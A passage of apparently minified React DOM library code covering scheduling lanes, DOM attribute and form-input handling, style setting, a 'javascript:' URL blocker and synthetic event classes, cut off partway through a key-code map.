	var Bn = Object.prototype.hasOwnProperty,
		qn = T.unstable_scheduleCallback,
		Cn = T.unstable_cancelCallback,
		fd = T.unstable_shouldYield,
		sd = T.unstable_requestPaint,
		St = T.unstable_now,
		od = T.unstable_getCurrentPriorityLevel,
		af = T.unstable_ImmediatePriority,
		uf = T.unstable_UserBlockingPriority,
		Su = T.unstable_NormalPriority,
		rd = T.unstable_LowPriority,
		nf = T.unstable_IdlePriority,
		dd = T.log,
		md = T.unstable_setDisableYieldValue,
		ba = null,
		Wl = null;
	function Zt(l) {
		if (
			(typeof dd == "function" && md(l),
			Wl && typeof Wl.setStrictMode == "function")
		)
			try {
				Wl.setStrictMode(ba, l);
			} catch {}
	}
	var $l = Math.clz32 ? Math.clz32 : gd,
		hd = Math.log,
		vd = Math.LN2;
	function gd(l) {
		return (l >>>= 0), l === 0 ? 32 : (31 - ((hd(l) / vd) | 0)) | 0;
	}
	var pu = 256,
		Nu = 4194304;
	function ve(l) {
		var t = l & 42;
		if (t !== 0) return t;
		switch (l & -l) {
			case 1:
				return 1;
			case 2:
				return 2;
			case 4:
				return 4;
			case 8:
				return 8;
			case 16:
				return 16;
			case 32:
				return 32;
			case 64:
				return 64;
			case 128:
				return 128;
			case 256:
			case 512:
			case 1024:
			case 2048:
			case 4096:
			case 8192:
			case 16384:
			case 32768:
			case 65536:
			case 131072:
			case 262144:
			case 524288:
			case 1048576:
			case 2097152:
				return l & 4194048;
			case 4194304:
			case 8388608:
			case 16777216:
			case 33554432:
				return l & 62914560;
			case 67108864:
				return 67108864;
			case 134217728:
				return 134217728;
			case 268435456:
				return 268435456;
			case 536870912:
				return 536870912;
			case 1073741824:
				return 0;
			default:
				return l;
		}
	}
	function ju(l, t, e) {
		var a = l.pendingLanes;
		if (a === 0) return 0;
		var u = 0,
			n = l.suspendedLanes,
			c = l.pingedLanes;
		l = l.warmLanes;
		var i = a & 134217727;
		return (
			i !== 0
				? ((a = i & ~n),
				  a !== 0
						? (u = ve(a))
						: ((c &= i),
						  c !== 0
								? (u = ve(c))
								: e || ((e = i & ~l), e !== 0 && (u = ve(e)))))
				: ((i = a & ~n),
				  i !== 0
						? (u = ve(i))
						: c !== 0
						? (u = ve(c))
						: e || ((e = a & ~l), e !== 0 && (u = ve(e)))),
			u === 0
				? 0
				: t !== 0 &&
				  t !== u &&
				  (t & n) === 0 &&
				  ((n = u & -u),
				  (e = t & -t),
				  n >= e || (n === 32 && (e & 4194048) !== 0))
				? t
				: u
		);
	}
	function Sa(l, t) {
		return (
			(l.pendingLanes & ~(l.suspendedLanes & ~l.pingedLanes) & t) === 0
		);
	}
	function yd(l, t) {
		switch (l) {
			case 1:
			case 2:
			case 4:
			case 8:
			case 64:
				return t + 250;
			case 16:
			case 32:
			case 128:
			case 256:
			case 512:
			case 1024:
			case 2048:
			case 4096:
			case 8192:
			case 16384:
			case 32768:
			case 65536:
			case 131072:
			case 262144:
			case 524288:
			case 1048576:
			case 2097152:
				return t + 5e3;
			case 4194304:
			case 8388608:
			case 16777216:
			case 33554432:
				return -1;
			case 67108864:
			case 134217728:
			case 268435456:
			case 536870912:
			case 1073741824:
				return -1;
			default:
				return -1;
		}
	}
	function cf() {
		var l = pu;
		return (pu <<= 1), (pu & 4194048) === 0 && (pu = 256), l;
	}
	function ff() {
		var l = Nu;
		return (Nu <<= 1), (Nu & 62914560) === 0 && (Nu = 4194304), l;
	}
	function Yn(l) {
		for (var t = [], e = 0; 31 > e; e++) t.push(l);
		return t;
	}
	function pa(l, t) {
		(l.pendingLanes |= t),
			t !== 268435456 &&
				((l.suspendedLanes = 0),
				(l.pingedLanes = 0),
				(l.warmLanes = 0));
	}
	function xd(l, t, e, a, u, n) {
		var c = l.pendingLanes;
		(l.pendingLanes = e),
			(l.suspendedLanes = 0),
			(l.pingedLanes = 0),
			(l.warmLanes = 0),
			(l.expiredLanes &= e),
			(l.entangledLanes &= e),
			(l.errorRecoveryDisabledLanes &= e),
			(l.shellSuspendCounter = 0);
		var i = l.entanglements,
			s = l.expirationTimes,
			v = l.hiddenUpdates;
		for (e = c & ~e; 0 < e; ) {
			var x = 31 - $l(e),
				p = 1 << x;
			(i[x] = 0), (s[x] = -1);
			var g = v[x];
			if (g !== null)
				for (v[x] = null, x = 0; x < g.length; x++) {
					var y = g[x];
					y !== null && (y.lane &= -536870913);
				}
			e &= ~p;
		}
		a !== 0 && sf(l, a, 0),
			n !== 0 &&
				u === 0 &&
				l.tag !== 0 &&
				(l.suspendedLanes |= n & ~(c & ~t));
	}
	function sf(l, t, e) {
		(l.pendingLanes |= t), (l.suspendedLanes &= ~t);
		var a = 31 - $l(t);
		(l.entangledLanes |= t),
			(l.entanglements[a] =
				l.entanglements[a] | 1073741824 | (e & 4194090));
	}
	function of(l, t) {
		var e = (l.entangledLanes |= t);
		for (l = l.entanglements; e; ) {
			var a = 31 - $l(e),
				u = 1 << a;
			(u & t) | (l[a] & t) && (l[a] |= t), (e &= ~u);
		}
	}
	function Gn(l) {
		switch (l) {
			case 2:
				l = 1;
				break;
			case 8:
				l = 4;
				break;
			case 32:
				l = 16;
				break;
			case 256:
			case 512:
			case 1024:
			case 2048:
			case 4096:
			case 8192:
			case 16384:
			case 32768:
			case 65536:
			case 131072:
			case 262144:
			case 524288:
			case 1048576:
			case 2097152:
			case 4194304:
			case 8388608:
			case 16777216:
			case 33554432:
				l = 128;
				break;
			case 268435456:
				l = 134217728;
				break;
			default:
				l = 0;
		}
		return l;
	}
	function Xn(l) {
		return (
			(l &= -l),
			2 < l ? (8 < l ? ((l & 134217727) !== 0 ? 32 : 268435456) : 8) : 2
		);
	}
	function rf() {
		var l = A.p;
		return l !== 0
			? l
			: ((l = window.event), l === void 0 ? 32 : Vr(l.type));
	}
	function bd(l, t) {
		var e = A.p;
		try {
			return (A.p = l), t();
		} finally {
			A.p = e;
		}
	}
	var Lt = Math.random().toString(36).slice(2),
		Hl = "__reactFiber$" + Lt,
		Gl = "__reactProps$" + Lt,
		we = "__reactContainer$" + Lt,
		Qn = "__reactEvents$" + Lt,
		Sd = "__reactListeners$" + Lt,
		pd = "__reactHandles$" + Lt,
		df = "__reactResources$" + Lt,
		Na = "__reactMarker$" + Lt;
	function Zn(l) {
		delete l[Hl], delete l[Gl], delete l[Qn], delete l[Sd], delete l[pd];
	}
	function He(l) {
		var t = l[Hl];
		if (t) return t;
		for (var e = l.parentNode; e; ) {
			if ((t = e[we] || e[Hl])) {
				if (
					((e = t.alternate),
					t.child !== null || (e !== null && e.child !== null))
				)
					for (l = _r(l); l !== null; ) {
						if ((e = l[Hl])) return e;
						l = _r(l);
					}
				return t;
			}
			(l = e), (e = l.parentNode);
		}
		return null;
	}
	function Be(l) {
		if ((l = l[Hl] || l[we])) {
			var t = l.tag;
			if (
				t === 5 ||
				t === 6 ||
				t === 13 ||
				t === 26 ||
				t === 27 ||
				t === 3
			)
				return l;
		}
		return null;
	}
	function ja(l) {
		var t = l.tag;
		if (t === 5 || t === 26 || t === 27 || t === 6) return l.stateNode;
		throw Error(h(33));
	}
	function qe(l) {
		var t = l[df];
		return (
			t ||
				(t = l[df] =
					{
						hoistableStyles: new Map(),
						hoistableScripts: new Map(),
					}),
			t
		);
	}
	function Al(l) {
		l[Na] = !0;
	}
	var mf = new Set(),
		hf = {};
	function ge(l, t) {
		Ce(l, t), Ce(l + "Capture", t);
	}
	function Ce(l, t) {
		for (hf[l] = t, l = 0; l < t.length; l++) mf.add(t[l]);
	}
	var Nd = RegExp(
			"^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"
		),
		vf = {},
		gf = {};
	function jd(l) {
		return Bn.call(gf, l)
			? !0
			: Bn.call(vf, l)
			? !1
			: Nd.test(l)
			? (gf[l] = !0)
			: ((vf[l] = !0), !1);
	}
	function Tu(l, t, e) {
		if (jd(t))
			if (e === null) l.removeAttribute(t);
			else {
				switch (typeof e) {
					case "undefined":
					case "function":
					case "symbol":
						l.removeAttribute(t);
						return;
					case "boolean":
						var a = t.toLowerCase().slice(0, 5);
						if (a !== "data-" && a !== "aria-") {
							l.removeAttribute(t);
							return;
						}
				}
				l.setAttribute(t, "" + e);
			}
	}
	function Eu(l, t, e) {
		if (e === null) l.removeAttribute(t);
		else {
			switch (typeof e) {
				case "undefined":
				case "function":
				case "symbol":
				case "boolean":
					l.removeAttribute(t);
					return;
			}
			l.setAttribute(t, "" + e);
		}
	}
	function zt(l, t, e, a) {
		if (a === null) l.removeAttribute(e);
		else {
			switch (typeof a) {
				case "undefined":
				case "function":
				case "symbol":
				case "boolean":
					l.removeAttribute(e);
					return;
			}
			l.setAttributeNS(t, e, "" + a);
		}
	}
	var Ln, yf;
	function Ye(l) {
		if (Ln === void 0)
			try {
				throw Error();
			} catch (e) {
				var t = e.stack.trim().match(/\n( *(at )?)/);
				(Ln = (t && t[1]) || ""),
					(yf =
						-1 <
						e.stack.indexOf(`
    at`)
							? " (<anonymous>)"
							: -1 < e.stack.indexOf("@")
							? "@unknown:0:0"
							: "");
			}
		return (
			`
` +
			Ln +
			l +
			yf
		);
	}
	var Vn = !1;
	function Kn(l, t) {
		if (!l || Vn) return "";
		Vn = !0;
		var e = Error.prepareStackTrace;
		Error.prepareStackTrace = void 0;
		try {
			var a = {
				DetermineComponentFrameRoot: function () {
					try {
						if (t) {
							var p = function () {
								throw Error();
							};
							if (
								(Object.defineProperty(p.prototype, "props", {
									set: function () {
										throw Error();
									},
								}),
								typeof Reflect == "object" && Reflect.construct)
							) {
								try {
									Reflect.construct(p, []);
								} catch (y) {
									var g = y;
								}
								Reflect.construct(l, [], p);
							} else {
								try {
									p.call();
								} catch (y) {
									g = y;
								}
								l.call(p.prototype);
							}
						} else {
							try {
								throw Error();
							} catch (y) {
								g = y;
							}
							(p = l()) &&
								typeof p.catch == "function" &&
								p.catch(function () {});
						}
					} catch (y) {
						if (y && g && typeof y.stack == "string")
							return [y.stack, g.stack];
					}
					return [null, null];
				},
			};
			a.DetermineComponentFrameRoot.displayName =
				"DetermineComponentFrameRoot";
			var u = Object.getOwnPropertyDescriptor(
				a.DetermineComponentFrameRoot,
				"name"
			);
			u &&
				u.configurable &&
				Object.defineProperty(a.DetermineComponentFrameRoot, "name", {
					value: "DetermineComponentFrameRoot",
				});
			var n = a.DetermineComponentFrameRoot(),
				c = n[0],
				i = n[1];
			if (c && i) {
				var s = c.split(`
`),
					v = i.split(`
`);
				for (
					u = a = 0;
					a < s.length &&
					!s[a].includes("DetermineComponentFrameRoot");

				)
					a++;
				for (
					;
					u < v.length &&
					!v[u].includes("DetermineComponentFrameRoot");

				)
					u++;
				if (a === s.length || u === v.length)
					for (
						a = s.length - 1, u = v.length - 1;
						1 <= a && 0 <= u && s[a] !== v[u];

					)
						u--;
				for (; 1 <= a && 0 <= u; a--, u--)
					if (s[a] !== v[u]) {
						if (a !== 1 || u !== 1)
							do
								if ((a--, u--, 0 > u || s[a] !== v[u])) {
									var x =
										`
` + s[a].replace(" at new ", " at ");
									return (
										l.displayName &&
											x.includes("<anonymous>") &&
											(x = x.replace(
												"<anonymous>",
												l.displayName
											)),
										x
									);
								}
							while (1 <= a && 0 <= u);
						break;
					}
			}
		} finally {
			(Vn = !1), (Error.prepareStackTrace = e);
		}
		return (e = l ? l.displayName || l.name : "") ? Ye(e) : "";
	}
	function Td(l) {
		switch (l.tag) {
			case 26:
			case 27:
			case 5:
				return Ye(l.type);
			case 16:
				return Ye("Lazy");
			case 13:
				return Ye("Suspense");
			case 19:
				return Ye("SuspenseList");
			case 0:
			case 15:
				return Kn(l.type, !1);
			case 11:
				return Kn(l.type.render, !1);
			case 1:
				return Kn(l.type, !0);
			case 31:
				return Ye("Activity");
			default:
				return "";
		}
	}
	function xf(l) {
		try {
			var t = "";
			do (t += Td(l)), (l = l.return);
			while (l);
			return t;
		} catch (e) {
			return (
				`
Error generating stack: ` +
				e.message +
				`
` +
				e.stack
			);
		}
	}
	function ut(l) {
		switch (typeof l) {
			case "bigint":
			case "boolean":
			case "number":
			case "string":
			case "undefined":
				return l;
			case "object":
				return l;
			default:
				return "";
		}
	}
	function bf(l) {
		var t = l.type;
		return (
			(l = l.nodeName) &&
			l.toLowerCase() === "input" &&
			(t === "checkbox" || t === "radio")
		);
	}
	function Ed(l) {
		var t = bf(l) ? "checked" : "value",
			e = Object.getOwnPropertyDescriptor(l.constructor.prototype, t),
			a = "" + l[t];
		if (
			!l.hasOwnProperty(t) &&
			typeof e < "u" &&
			typeof e.get == "function" &&
			typeof e.set == "function"
		) {
			var u = e.get,
				n = e.set;
			return (
				Object.defineProperty(l, t, {
					configurable: !0,
					get: function () {
						return u.call(this);
					},
					set: function (c) {
						(a = "" + c), n.call(this, c);
					},
				}),
				Object.defineProperty(l, t, { enumerable: e.enumerable }),
				{
					getValue: function () {
						return a;
					},
					setValue: function (c) {
						a = "" + c;
					},
					stopTracking: function () {
						(l._valueTracker = null), delete l[t];
					},
				}
			);
		}
	}
	function Au(l) {
		l._valueTracker || (l._valueTracker = Ed(l));
	}
	function Sf(l) {
		if (!l) return !1;
		var t = l._valueTracker;
		if (!t) return !0;
		var e = t.getValue(),
			a = "";
		return (
			l && (a = bf(l) ? (l.checked ? "true" : "false") : l.value),
			(l = a),
			l !== e ? (t.setValue(l), !0) : !1
		);
	}
	function zu(l) {
		if (
			((l = l || (typeof document < "u" ? document : void 0)),
			typeof l > "u")
		)
			return null;
		try {
			return l.activeElement || l.body;
		} catch {
			return l.body;
		}
	}
	var Ad = /[\n"\\]/g;
	function nt(l) {
		return l.replace(Ad, function (t) {
			return "\\" + t.charCodeAt(0).toString(16) + " ";
		});
	}
	function Jn(l, t, e, a, u, n, c, i) {
		(l.name = ""),
			c != null &&
			typeof c != "function" &&
			typeof c != "symbol" &&
			typeof c != "boolean"
				? (l.type = c)
				: l.removeAttribute("type"),
			t != null
				? c === "number"
					? ((t === 0 && l.value === "") || l.value != t) &&
					  (l.value = "" + ut(t))
					: l.value !== "" + ut(t) && (l.value = "" + ut(t))
				: (c !== "submit" && c !== "reset") ||
				  l.removeAttribute("value"),
			t != null
				? kn(l, c, ut(t))
				: e != null
				? kn(l, c, ut(e))
				: a != null && l.removeAttribute("value"),
			u == null && n != null && (l.defaultChecked = !!n),
			u != null &&
				(l.checked =
					u && typeof u != "function" && typeof u != "symbol"),
			i != null &&
			typeof i != "function" &&
			typeof i != "symbol" &&
			typeof i != "boolean"
				? (l.name = "" + ut(i))
				: l.removeAttribute("name");
	}
	function pf(l, t, e, a, u, n, c, i) {
		if (
			(n != null &&
				typeof n != "function" &&
				typeof n != "symbol" &&
				typeof n != "boolean" &&
				(l.type = n),
			t != null || e != null)
		) {
			if (!((n !== "submit" && n !== "reset") || t != null)) return;
			(e = e != null ? "" + ut(e) : ""),
				(t = t != null ? "" + ut(t) : e),
				i || t === l.value || (l.value = t),
				(l.defaultValue = t);
		}
		(a = a ?? u),
			(a = typeof a != "function" && typeof a != "symbol" && !!a),
			(l.checked = i ? l.checked : !!a),
			(l.defaultChecked = !!a),
			c != null &&
				typeof c != "function" &&
				typeof c != "symbol" &&
				typeof c != "boolean" &&
				(l.name = c);
	}
	function kn(l, t, e) {
		(t === "number" && zu(l.ownerDocument) === l) ||
			l.defaultValue === "" + e ||
			(l.defaultValue = "" + e);
	}
	function Ge(l, t, e, a) {
		if (((l = l.options), t)) {
			t = {};
			for (var u = 0; u < e.length; u++) t["$" + e[u]] = !0;
			for (e = 0; e < l.length; e++)
				(u = t.hasOwnProperty("$" + l[e].value)),
					l[e].selected !== u && (l[e].selected = u),
					u && a && (l[e].defaultSelected = !0);
		} else {
			for (e = "" + ut(e), t = null, u = 0; u < l.length; u++) {
				if (l[u].value === e) {
					(l[u].selected = !0), a && (l[u].defaultSelected = !0);
					return;
				}
				t !== null || l[u].disabled || (t = l[u]);
			}
			t !== null && (t.selected = !0);
		}
	}
	function Nf(l, t, e) {
		if (
			t != null &&
			((t = "" + ut(t)), t !== l.value && (l.value = t), e == null)
		) {
			l.defaultValue !== t && (l.defaultValue = t);
			return;
		}
		l.defaultValue = e != null ? "" + ut(e) : "";
	}
	function jf(l, t, e, a) {
		if (t == null) {
			if (a != null) {
				if (e != null) throw Error(h(92));
				if (wl(a)) {
					if (1 < a.length) throw Error(h(93));
					a = a[0];
				}
				e = a;
			}
			e == null && (e = ""), (t = e);
		}
		(e = ut(t)),
			(l.defaultValue = e),
			(a = l.textContent),
			a === e && a !== "" && a !== null && (l.value = a);
	}
	function Xe(l, t) {
		if (t) {
			var e = l.firstChild;
			if (e && e === l.lastChild && e.nodeType === 3) {
				e.nodeValue = t;
				return;
			}
		}
		l.textContent = t;
	}
	var zd = new Set(
		"animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(
			" "
		)
	);
	function Tf(l, t, e) {
		var a = t.indexOf("--") === 0;
		e == null || typeof e == "boolean" || e === ""
			? a
				? l.setProperty(t, "")
				: t === "float"
				? (l.cssFloat = "")
				: (l[t] = "")
			: a
			? l.setProperty(t, e)
			: typeof e != "number" || e === 0 || zd.has(t)
			? t === "float"
				? (l.cssFloat = e)
				: (l[t] = ("" + e).trim())
			: (l[t] = e + "px");
	}
	function Ef(l, t, e) {
		if (t != null && typeof t != "object") throw Error(h(62));
		if (((l = l.style), e != null)) {
			for (var a in e)
				!e.hasOwnProperty(a) ||
					(t != null && t.hasOwnProperty(a)) ||
					(a.indexOf("--") === 0
						? l.setProperty(a, "")
						: a === "float"
						? (l.cssFloat = "")
						: (l[a] = ""));
			for (var u in t)
				(a = t[u]), t.hasOwnProperty(u) && e[u] !== a && Tf(l, u, a);
		} else for (var n in t) t.hasOwnProperty(n) && Tf(l, n, t[n]);
	}
	function Wn(l) {
		if (l.indexOf("-") === -1) return !1;
		switch (l) {
			case "annotation-xml":
			case "color-profile":
			case "font-face":
			case "font-face-src":
			case "font-face-uri":
			case "font-face-format":
			case "font-face-name":
			case "missing-glyph":
				return !1;
			default:
				return !0;
		}
	}
	var Md = new Map([
			["acceptCharset", "accept-charset"],
			["htmlFor", "for"],
			["httpEquiv", "http-equiv"],
			["crossOrigin", "crossorigin"],
			["accentHeight", "accent-height"],
			["alignmentBaseline", "alignment-baseline"],
			["arabicForm", "arabic-form"],
			["baselineShift", "baseline-shift"],
			["capHeight", "cap-height"],
			["clipPath", "clip-path"],
			["clipRule", "clip-rule"],
			["colorInterpolation", "color-interpolation"],
			["colorInterpolationFilters", "color-interpolation-filters"],
			["colorProfile", "color-profile"],
			["colorRendering", "color-rendering"],
			["dominantBaseline", "dominant-baseline"],
			["enableBackground", "enable-background"],
			["fillOpacity", "fill-opacity"],
			["fillRule", "fill-rule"],
			["floodColor", "flood-color"],
			["floodOpacity", "flood-opacity"],
			["fontFamily", "font-family"],
			["fontSize", "font-size"],
			["fontSizeAdjust", "font-size-adjust"],
			["fontStretch", "font-stretch"],
			["fontStyle", "font-style"],
			["fontVariant", "font-variant"],
			["fontWeight", "font-weight"],
			["glyphName", "glyph-name"],
			["glyphOrientationHorizontal", "glyph-orientation-horizontal"],
			["glyphOrientationVertical", "glyph-orientation-vertical"],
			["horizAdvX", "horiz-adv-x"],
			["horizOriginX", "horiz-origin-x"],
			["imageRendering", "image-rendering"],
			["letterSpacing", "letter-spacing"],
			["lightingColor", "lighting-color"],
			["markerEnd", "marker-end"],
			["markerMid", "marker-mid"],
			["markerStart", "marker-start"],
			["overlinePosition", "overline-position"],
			["overlineThickness", "overline-thickness"],
			["paintOrder", "paint-order"],
			["panose-1", "panose-1"],
			["pointerEvents", "pointer-events"],
			["renderingIntent", "rendering-intent"],
			["shapeRendering", "shape-rendering"],
			["stopColor", "stop-color"],
			["stopOpacity", "stop-opacity"],
			["strikethroughPosition", "strikethrough-position"],
			["strikethroughThickness", "strikethrough-thickness"],
			["strokeDasharray", "stroke-dasharray"],
			["strokeDashoffset", "stroke-dashoffset"],
			["strokeLinecap", "stroke-linecap"],
			["strokeLinejoin", "stroke-linejoin"],
			["strokeMiterlimit", "stroke-miterlimit"],
			["strokeOpacity", "stroke-opacity"],
			["strokeWidth", "stroke-width"],
			["textAnchor", "text-anchor"],
			["textDecoration", "text-decoration"],
			["textRendering", "text-rendering"],
			["transformOrigin", "transform-origin"],
			["underlinePosition", "underline-position"],
			["underlineThickness", "underline-thickness"],
			["unicodeBidi", "unicode-bidi"],
			["unicodeRange", "unicode-range"],
			["unitsPerEm", "units-per-em"],
			["vAlphabetic", "v-alphabetic"],
			["vHanging", "v-hanging"],
			["vIdeographic", "v-ideographic"],
			["vMathematical", "v-mathematical"],
			["vectorEffect", "vector-effect"],
			["vertAdvY", "vert-adv-y"],
			["vertOriginX", "vert-origin-x"],
			["vertOriginY", "vert-origin-y"],
			["wordSpacing", "word-spacing"],
			["writingMode", "writing-mode"],
			["xmlnsXlink", "xmlns:xlink"],
			["xHeight", "x-height"],
		]),
		Od =
			/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
	function Mu(l) {
		return Od.test("" + l)
			? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')"
			: l;
	}
	var $n = null;
	function Fn(l) {
		return (
			(l = l.target || l.srcElement || window),
			l.correspondingUseElement && (l = l.correspondingUseElement),
			l.nodeType === 3 ? l.parentNode : l
		);
	}
	var Qe = null,
		Ze = null;
	function Af(l) {
		var t = Be(l);
		if (t && (l = t.stateNode)) {
			var e = l[Gl] || null;
			l: switch (((l = t.stateNode), t.type)) {
				case "input":
					if (
						(Jn(
							l,
							e.value,
							e.defaultValue,
							e.defaultValue,
							e.checked,
							e.defaultChecked,
							e.type,
							e.name
						),
						(t = e.name),
						e.type === "radio" && t != null)
					) {
						for (e = l; e.parentNode; ) e = e.parentNode;
						for (
							e = e.querySelectorAll(
								'input[name="' + nt("" + t) + '"][type="radio"]'
							),
								t = 0;
							t < e.length;
							t++
						) {
							var a = e[t];
							if (a !== l && a.form === l.form) {
								var u = a[Gl] || null;
								if (!u) throw Error(h(90));
								Jn(
									a,
									u.value,
									u.defaultValue,
									u.defaultValue,
									u.checked,
									u.defaultChecked,
									u.type,
									u.name
								);
							}
						}
						for (t = 0; t < e.length; t++)
							(a = e[t]), a.form === l.form && Sf(a);
					}
					break l;
				case "textarea":
					Nf(l, e.value, e.defaultValue);
					break l;
				case "select":
					(t = e.value), t != null && Ge(l, !!e.multiple, t, !1);
			}
		}
	}
	var In = !1;
	function zf(l, t, e) {
		if (In) return l(t, e);
		In = !0;
		try {
			var a = l(t);
			return a;
		} finally {
			if (
				((In = !1),
				(Qe !== null || Ze !== null) &&
					(hn(),
					Qe && ((t = Qe), (l = Ze), (Ze = Qe = null), Af(t), l)))
			)
				for (t = 0; t < l.length; t++) Af(l[t]);
		}
	}
	function Ta(l, t) {
		var e = l.stateNode;
		if (e === null) return null;
		var a = e[Gl] || null;
		if (a === null) return null;
		e = a[t];
		l: switch (t) {
			case "onClick":
			case "onClickCapture":
			case "onDoubleClick":
			case "onDoubleClickCapture":
			case "onMouseDown":
			case "onMouseDownCapture":
			case "onMouseMove":
			case "onMouseMoveCapture":
			case "onMouseUp":
			case "onMouseUpCapture":
			case "onMouseEnter":
				(a = !a.disabled) ||
					((l = l.type),
					(a = !(
						l === "button" ||
						l === "input" ||
						l === "select" ||
						l === "textarea"
					))),
					(l = !a);
				break l;
			default:
				l = !1;
		}
		if (l) return null;
		if (e && typeof e != "function") throw Error(h(231, t, typeof e));
		return e;
	}
	var Mt = !(
			typeof window > "u" ||
			typeof window.document > "u" ||
			typeof window.document.createElement > "u"
		),
		Pn = !1;
	if (Mt)
		try {
			var Ea = {};
			Object.defineProperty(Ea, "passive", {
				get: function () {
					Pn = !0;
				},
			}),
				window.addEventListener("test", Ea, Ea),
				window.removeEventListener("test", Ea, Ea);
		} catch {
			Pn = !1;
		}
	var Vt = null,
		lc = null,
		Ou = null;
	function Mf() {
		if (Ou) return Ou;
		var l,
			t = lc,
			e = t.length,
			a,
			u = "value" in Vt ? Vt.value : Vt.textContent,
			n = u.length;
		for (l = 0; l < e && t[l] === u[l]; l++);
		var c = e - l;
		for (a = 1; a <= c && t[e - a] === u[n - a]; a++);
		return (Ou = u.slice(l, 1 < a ? 1 - a : void 0));
	}
	function _u(l) {
		var t = l.keyCode;
		return (
			"charCode" in l
				? ((l = l.charCode), l === 0 && t === 13 && (l = 13))
				: (l = t),
			l === 10 && (l = 13),
			32 <= l || l === 13 ? l : 0
		);
	}
	function Du() {
		return !0;
	}
	function Of() {
		return !1;
	}
	function Xl(l) {
		function t(e, a, u, n, c) {
			(this._reactName = e),
				(this._targetInst = u),
				(this.type = a),
				(this.nativeEvent = n),
				(this.target = c),
				(this.currentTarget = null);
			for (var i in l)
				l.hasOwnProperty(i) &&
					((e = l[i]), (this[i] = e ? e(n) : n[i]));
			return (
				(this.isDefaultPrevented = (
					n.defaultPrevented != null
						? n.defaultPrevented
						: n.returnValue === !1
				)
					? Du
					: Of),
				(this.isPropagationStopped = Of),
				this
			);
		}
		return (
			_(t.prototype, {
				preventDefault: function () {
					this.defaultPrevented = !0;
					var e = this.nativeEvent;
					e &&
						(e.preventDefault
							? e.preventDefault()
							: typeof e.returnValue != "unknown" &&
							  (e.returnValue = !1),
						(this.isDefaultPrevented = Du));
				},
				stopPropagation: function () {
					var e = this.nativeEvent;
					e &&
						(e.stopPropagation
							? e.stopPropagation()
							: typeof e.cancelBubble != "unknown" &&
							  (e.cancelBubble = !0),
						(this.isPropagationStopped = Du));
				},
				persist: function () {},
				isPersistent: Du,
			}),
			t
		);
	}
	var ye = {
			eventPhase: 0,
			bubbles: 0,
			cancelable: 0,
			timeStamp: function (l) {
				return l.timeStamp || Date.now();
			},
			defaultPrevented: 0,
			isTrusted: 0,
		},
		Ru = Xl(ye),
		Aa = _({}, ye, { view: 0, detail: 0 }),
		_d = Xl(Aa),
		tc,
		ec,
		za,
		Uu = _({}, Aa, {
			screenX: 0,
			screenY: 0,
			clientX: 0,
			clientY: 0,
			pageX: 0,
			pageY: 0,
			ctrlKey: 0,
			shiftKey: 0,
			altKey: 0,
			metaKey: 0,
			getModifierState: uc,
			button: 0,
			buttons: 0,
			relatedTarget: function (l) {
				return l.relatedTarget === void 0
					? l.fromElement === l.srcElement
						? l.toElement
						: l.fromElement
					: l.relatedTarget;
			},
			movementX: function (l) {
				return "movementX" in l
					? l.movementX
					: (l !== za &&
							(za && l.type === "mousemove"
								? ((tc = l.screenX - za.screenX),
								  (ec = l.screenY - za.screenY))
								: (ec = tc = 0),
							(za = l)),
					  tc);
			},
			movementY: function (l) {
				return "movementY" in l ? l.movementY : ec;
			},
		}),
		_f = Xl(Uu),
		Dd = _({}, Uu, { dataTransfer: 0 }),
		Rd = Xl(Dd),
		Ud = _({}, Aa, { relatedTarget: 0 }),
		ac = Xl(Ud),
		wd = _({}, ye, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
		Hd = Xl(wd),
		Bd = _({}, ye, {
			clipboardData: function (l) {
				return "clipboardData" in l
					? l.clipboardData
					: window.clipboardData;
			},
		}),
		qd = Xl(Bd),
		Cd = _({}, ye, { data: 0 }),
		Df = Xl(Cd),
		Yd = {
			Esc: "Escape",
			Spacebar: " ",
			Left: "ArrowLeft",
			Up: "ArrowUp",
			Right: "ArrowRight",
			Down: "ArrowDown",
			Del: "Delete",
			Win: "OS",
			Menu: "ContextMenu",
			Apps: "ContextMenu",
			Scroll: "ScrollLock",
			MozPrintableKey: "Unidentified",
		},
		Gd = {
			8: "Backspace",
			9: "Tab",
			12: "Clear",
			13: "Enter",
			16: "Shift",
			17: "Control",
			18: "Alt",
			19: "Pause",
			20: "CapsLock",
			27: "Escape",
			32: " ",
			33: "PageUp",
			34: "PageDown",
			35: "End",
			36: "Home",
			37: "ArrowLeft",
			38: "ArrowUp",
			39: "ArrowRight",
			40: "ArrowDown",
			45: "Insert",
			46: "Delete",
			112: "F1",
			113: "F2",
			114: "F3",
			115: "F4",
			116: "F5",
			117: "F6",
			118: "F7",
			119: "F8",
			120: "F9",
			121: "F10",
			122: "F11",
			123: "F12",
			144: "NumLock",
